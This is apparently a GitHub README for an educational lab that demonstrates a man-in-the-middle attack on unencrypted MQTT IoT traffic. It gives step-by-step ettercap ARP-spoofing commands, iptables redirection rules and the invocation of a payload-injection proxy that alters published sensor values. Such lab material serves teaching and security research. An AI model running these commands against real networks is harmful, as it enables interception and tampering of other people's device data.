# Man-in-the-middle (mitm) attack on MQTT IoT based communication
A complete tutorial and toolkit for demonstrating a Man-in-the-Middle (MITM) attack on the MQTT protocol. This project is for educational and cybersecurity research purposes to understand IoT vulnerabilities. Includes Python (Asyncio, Paho-MQTT) for a payload-injection proxy and bash scripts using ettercap (ARP spoofing) and iptables.

This repository includes:
- Python (Asyncio, Paho-MQTT) scripts for a payload-injection proxy.
- Bash scripts and commands using ettercap (for ARP spoofing) and iptables (for traffic redirection).
- Example publisher.py and subscriber.py clients.
## Ethical Warning
This repository is for educational and cybersecurity research purposes only. The tools and techniques demonstrated here are to help users understand vulnerabilities in unencrypted IoT protocols. Do not use this code for malicious activities. The author is not responsible for any misuse of this information.
## Attack Architecture
This demonstration involves four main components, all operating on the same local network:
1. MQTT Broker (e.g., 192.168.1.2):
- What it is: The central server that handles MQTT messages.
- Software: Mosquitto (or any other MQTT broker).
- How to run: Must be configured to listen for connections (e.g., on port 1883).
2. Publisher Client (e.g., 192.168.1.183):
- What it is: A device (like a sensor or laptop) that sends data to the broker.
- Script: publisher.py
- How to run: python3 publisher.py
3. Subscriber Client (e.g., 192.168.1.184):
- What it is: A device (like an application server or laptop) that receives data from the broker.
- Script: subscriber.py
- How to run: python3 subscriber.py
4. Attacker Machine (e.g., 192.168.1.190):
- What it is: The machine that will intercept and modify the traffic.
- Script: mqtt_tcp_mitm.py
- How to run: This script is run as a proxy, supported by iptables and ettercap commands.
# Setup and Prerequisites
## 1. Broker Machine Setup
### 1. Install the Mosquitto broker. On a Debian-based system:
```bash
sudo apt-get update
sudo apt-get install mosquitto mosquitto-clients
```
### 2. Configure Mosquitto to allow external connections. Edit the configuration file (e.g., /etc/mosquitto/mosquitto.conf):
```bash
# Allow connections from any IP
listener 1883 0.0.0.0
# Allow anonymous connections for this demo
allow_anonymous true
```
### 3. Start the Mosquitto service:
```bash
# On Linux
sudo systemctl restart mosquitto

# Or on Windows (as per your notes)
net start mosquitto
```
## 2. Publisher & Subscriber Machine Setup
### On both the publisher and subscriber machines, you only need to install the paho-mqtt library.
```bash
pip3 install paho-mqtt
```
## 3. Attacker Machine Setup
### 1. Update packages and install necessary tools:
```
sudo apt-get update
sudo apt-get install -y python3-venv python3-pip tcpdump dsniff iptables
sudo apt-get install -y ettercap-common ettercap-graphical
```
### 2. Create a Python virtual environment (optional but recommended):
```
python3 -m venv mitm_env
source mitm_env/bin/activate
```
### 3. Install Python dependencies:
```
pip3 install paho-mqtt
```
### 4. Make the proxy script executable:
```
chmod +x mqtt_tcp_mitm.py
```
# Executing the Attack (Step-by-Step)
## Step 1: Start the Publisher and Subscriber
### 1. On the Subscriber machine: Run the subscriber script. It will connect to the broker and wait for messages.
```
python3 subscriber.py
# Output: Received: [original_value]
```
### 2. On the Publisher machine: Run the publisher script.
```
python3 publisher.py
```
### 3. Observe: At this point, the Subscriber should be printing the original, unmodified values sent by the Publisher.
## Step 2: Configure Attacker Network (Terminal 1)
Note: Replace placeholders ($BROKER_IP, etc.) with your actual IPs.
### 1. Enable IP forwarding on the attacker machine:
```
sudo sysctl -w net.ipv4.ip_forward=1
```
### 2. Set up iptables rules to redirect traffic destined for the broker to the local proxy.
```
# Variables for clarity
BROKER_IP="192.168.1.2"
ATTACKER_IP="192.168.1.190"

# Redirect incoming TCP packets (destined for broker) to our local proxy port
sudo iptables -t nat -A PREROUTING -p tcp -d $BROKER_IP --dport 1883 -j DNAT --to-destination $ATTACKER_IP:1883

# Masquerade outgoing proxied connections
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
```
## Step 3: Start the MITM Proxy (Terminal 1)
### 1. Run the Python proxy script. It will listen for the redirected traffic and forward it to the real broker.
```
python3 mqtt_tcp_mitm.py --listen-host 0.0.0.0 --listen-port 1883 --upstream-host 192.168.1.2 --upstream-port 1883
```
### 2. You should see the following output, confirming the proxy is running:
```
INFO:mqtt-mitm:MITM proxy listening on 0.0.0.0:1883 forwarding to 192.168.1.2:1883
```
## Step 4: Launch ARP Spoofing (Terminal 2)
### 1. In a new terminal on the attacker machine, use ettercap to poison the ARP cache of the publisher. This tricks the publisher into sending its broker-bound traffic to the attacker's machine instead.
```
# Variables for clarity
PUBLISHER_IP="192.168.1.183"
BROKER_IP="192.168.1.2"

# Command format: sudo ettercap -T -M arp:remote /<Target 1>//<Target 2>/
sudo ettercap -T -M arp:remote /$PUBLISHER_IP//$BROKER_IP/
```
## Step 5: Observe the Results
- Attacker Terminal 1 (Proxy): You will see log messages showing the data being modified in real-time.
```
INFO:mqtt-mitm:Modified PUBLISH topic=test old=[12] new=[312] (dir=c2s)
```
- Subscriber Terminal: You will now see the modified values (e.g., [312]) being printed instead of the original values. The attack is successful.
# Cleanup
After you are finished, follow these steps to restore the network.
### 1. Stop ettercap in Terminal 2 (press q).
### 2. Stop the mqtt_tcp_mitm.py proxy in Terminal 1 (Ctrl+C).
### 3. Remove the iptables rules on the attacker machine:
```
# Use the same IPs you used in setup
BROKER_IP="192.168.1.2"
ATTACKER_IP="192.168.1.190"

sudo iptables -t nat -D PREROUTING -p tcp -d $BROKER_IP --dport 1883 -j DNAT --to-destination $ATTACKER_IP:1883
sudo iptables -t nat -D POSTROUTING -j MASQUERADE
```
### 4. Disable IP forwarding on the attacker machine:
```
sudo sysctl -w net.ipv4.ip_forward=0
```
### 5. Stop the Mosquitto broker on the broker machine:
```
# On Linux
sudo systemctl stop mosquitto

# Or on Windows
net stop mosquitto
```
# Citation
If you use this project in your research or find it helpful, please consider citing it.
## Bibtex
```
@misc{Rafy_2025_MQTTMITM,
  author       = {Rafy, Md Fazley},
  title        = {mqtt-mitm-attack-demo: A tutorial for MITM attacks on MQTT},
  year         = {2025},
  publisher    = {GitHub},
  journal      = {GitHub repository},
  howpublished = {\url{https://github.com/fazleyrafy/Man-in-the-middle-mitm-attack-on-MQTT-IoT-based-communication}},
  version      = {1.0.0},
  date         = {2025-10-30}
}
```
# License
This project is licensed under the MIT License. See the LICENSE file for details.
